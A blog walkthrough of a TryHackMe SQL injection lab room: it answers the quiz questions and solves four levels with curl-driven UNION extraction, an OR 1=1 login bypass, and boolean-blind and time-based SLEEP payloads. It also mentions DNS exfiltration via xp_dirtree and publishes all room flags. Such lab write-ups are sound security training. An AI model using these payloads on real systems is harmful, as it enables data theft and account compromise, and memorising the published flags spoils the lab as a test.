---
title: "TryHackMe SQL Injection Introduction: Four Lab Levels"
date: 2026-09-01T14:25:00+05:30
lastmod: 2026-09-01T14:25:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-sqli-intro/00-thumbnail.png

categories:
  - TryHackMe

tags:
  - tryhackme
  - thm
  - rooms
  - Jr Penetration Tester
  - Web Application Security
  - SQL Injection
  - MySQL
  - Blind SQLi
  - UNION

draft: false
description: "Walkthrough of the TryHackMe SQL Injection Introduction room: four lab levels covering UNION extraction, login bypass, boolean-blind and time-based blind SQLi."
---

SQL Injection Introduction sits in the Web Application Vulnerabilities I module of the Jr Penetration Tester path, a few rooms after [Content Discovery](/post/thm-room-contentdiscoveryx/) and alongside [Web Server Attacks I](/post/thm-room-webserverattacks/). The theory tasks are short. The value is in Task 9, a four-level lab that isolates one injection technique per level and shows you the live SQL query as you type into it.

I solved all four levels from the terminal rather than the browser UI. Reading the level pages showed that the mock browser is only a wrapper: every level posts the assembled query to a single `/run` endpoint with a `level` parameter. That makes each level a two-line curl loop, and it makes the boolean-blind and time-based levels scriptable instead of tedious.

## Task 1: Introduction

No answer needed. The room frames SQL Injection as an input-handling failure: user data is concatenated into a query string instead of being bound as a parameter, so the data crosses into the code.

## Task 2: SQL essentials for injection

Two definitions worth having before you touch the lab.

`UNION` is the statement that **UNION** combines the results of two SELECT queries into one result set. It is the workhorse of In-Band injection, and it carries one hard rule: both SELECT statements must return the same number of columns, or MySQL rejects the whole query.

The metadata database is **information_schema**. It holds a row for every database, table and column the server knows about, which is how you enumerate a schema you have never seen.

## Task 3: What is SQL injection

The classic first probe is the single quote, **'**. If the application concatenates your input into a quoted string, one unbalanced quote breaks the syntax and the database complains. An error is a positive signal.

Injection that returns its results directly on the rendered page is **In-Band** SQLi. You see the extracted data in the response you already have, no second channel needed.

## Task 4: In-Band SQL injection

The subtype that leans on database error messages to leak information is **Error-based** SQLi. You deliberately trigger a malformed query and read what the engine spills into the response.

The MySQL function that returns the name of the currently selected database is **database()**. It is usually the first thing you place in a UNION column, because every later `information_schema` query needs the schema name as a filter.

## Task 5: Blind SQLi authentication bypass

The condition injected to force a `WHERE` clause always true is **1=1**. Dropped into a login query as `' OR 1=1;-- -`, it makes the comparison irrelevant and returns the first row in the table.

## Task 6: Boolean and time-based blind SQLi

The MySQL function that introduces a deliberate delay is **SLEEP**. When the application returns nothing useful, not the data, not an error, not even a different page, response time becomes the only channel you have.

## Task 7: Out-of-band SQL injection

The protocol commonly abused to exfiltrate data out-of-band is **DNS**. A lookup for `<stolen-data>.attacker.tld` leaves your controlled nameserver holding the answer, and DNS is rarely filtered as aggressively as outbound HTTP.

On MSSQL the stored procedure that triggers those lookups is **xp_dirtree**. Point it at a UNC path built from your query result and the server resolves the hostname on your behalf.

## Task 8: Remediation and prevention

The primary defence is **Prepared Statements**, that is parameterised queries. The query structure is sent to the database first, the values second, so user input is never parsed as SQL. Input validation, least-privilege database accounts and a WAF are supporting controls, not substitutes.

{{< ad >}}

## Task 9: The four-level lab

Start the lab machine, then read the level pages before playing them. Level 1's inline script gives away the whole architecture:

```javascript
  // from http://MACHINE_IP/level1
  fetch("/run", {
      body: "level=1&sql=" + current_sql,
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      method: "post",
  })
  ...
  function writeQuery(str) {
      let qry = "select * from article where id = "+str;
```

The browser assembles the full SQL client-side and posts it to `/run`. Every level does the same thing with a different `level` value and a different query template. So the entire lab is reachable with curl.

### Level 1: In-Band UNION extraction

Template: `select * from article where id = <input>`. Three columns, and column 3 is the one rendered into the article body.

```bash
  T=10.48.188.185
  run(){ curl -s -X POST http://$T/run -d level=1 \
      --data-urlencode "sql=select * from article where id = $1"; }

  run "0 UNION SELECT 1,2,database()"
  run "0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one'"
  run "0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users'"
```

Setting the id to `0` matters. With a valid id the real article fills the page and pushes the injected row out of view; with `0` the original query matches nothing and only the UNION row renders.

![Terminal output showing UNION SELECT queries against level 1 returning the database name sqli_one, the tables article and staff_users, and the columns id, username and password](/img/thm-sqli-intro/01-level1-union.png)

Three queries give the full path: database `sqli_one`, tables `article` and `staff_users`, columns `id,username,password`. A fourth dumps the credentials with `group_concat(username,':',password) FROM staff_users`, returning three accounts.

One trap here. The obvious move is to take the `admin` password to the level's password box, and it is rejected. The accepted credential belongs to `martin`, not `admin`. Dump all three rows and try each rather than assuming the admin row is the target.

Flag 1: **THM{SQL_INJECTION_3840}**

### Level 2: authentication bypass

Template: `select * from users where username='<user>' and password='<pass>' LIMIT 1;`

Username `admin`, password `' OR 1=1;-- -`. The injected quote closes the password string, `OR 1=1` makes the whole `WHERE` true, and `;-- -` discards the trailing `' LIMIT 1;`. The endpoint returns the admin row and the level unlocks.

![Terminal output showing the level 2 authentication bypass returning the admin row, and level 3 boolean-blind probes returning taken true and false for password length tests](/img/thm-sqli-intro/02-level2-3-blind.png)

Flag 2: **THM{SQL_INJECTION_9581}**

### Level 3: boolean-blind

Template: `select * from users where username = '<input>' LIMIT 1`. The page is a username availability check, and the only output is `{"taken":true}` or `{"taken":false}`. That single bit is enough.

The oracle: a row returned means true, no row means false. Test the length first, then walk the password one character at a time.

```bash
  admin' AND length(password)=4;-- -            # {"taken":true}
  admin' AND substr(password,1,1)='3';-- -      # {"taken":true}
```

Scripted over digits and letters, the admin password comes out as four characters in under a minute. Feed it to `/checklogin` with username `admin`.

Flag 3: **THM{SQL_INJECTION_1093}**

### Level 4: time-based blind

Template: `select * from analytics_referrers where domain='<input>' LIMIT 1`. Nothing renders at all, so the response body carries no signal.

My first payload failed with `SQLSTATE[21000]: Cardinality violation: 1222`. I had assumed three columns, copying the level 1 shape. `analytics_referrers` has two. Walking `UNION SELECT 1`, `1,2`, `1,2,3` finds the right width in seconds, and only the two-column form succeeds:

```bash
  select * from analytics_referrers where domain='x'
    UNION SELECT SLEEP(2),2 FROM users
    WHERE username='admin' AND substr(password,1,1)='4';-- -
```

The other thing worth noticing: this endpoint returns its own execution time in the JSON, as a `time` field. That is a far cleaner oracle than measuring wall-clock latency from the client, and it removes network jitter from the decision entirely.

![Terminal output showing time-based blind probes where a false condition returns in 0.001s and true conditions return in 2.002s, followed by all four room flags](/img/thm-sqli-intro/03-level4-time.png)

A false condition comes back in `0.001s`, a true one in `2.002s`. Same length-then-substring walk, then `/checklogin2` with the recovered password.

Flag 4: **THM{SQL_INJECTION_MASTER}**

One note on evidence. Chrome on this machine could not route to the lab IP over the THM VPN even though curl could, so every screenshot here is terminal-side. If your browser refuses the lab but curl reaches it, that is a routing quirk, not a dead box.

## Task 10: Conclusion

No answer needed.

## Takeaways

**Read the client before you play the game.** Every level in this lab renders a fake browser, but the real interface is one POST to `/run` with the query already assembled in JavaScript. Thirty seconds of reading the page source turned four levels of clicking into four curl commands, and made the two blind levels scriptable rather than manual.

**Match the oracle to what the application actually gives you.** Level 1 hands you rendered output, level 3 hands you one boolean, level 4 hands you nothing but latency, and level 4 quietly hands you a server-measured `time` field that beats client-side timing. The injection is the same idea each time; the extraction channel is what changes, and picking the noisiest available signal is what makes blind extraction reliable.

Room solved 100%: 10 tasks, 16 answers.
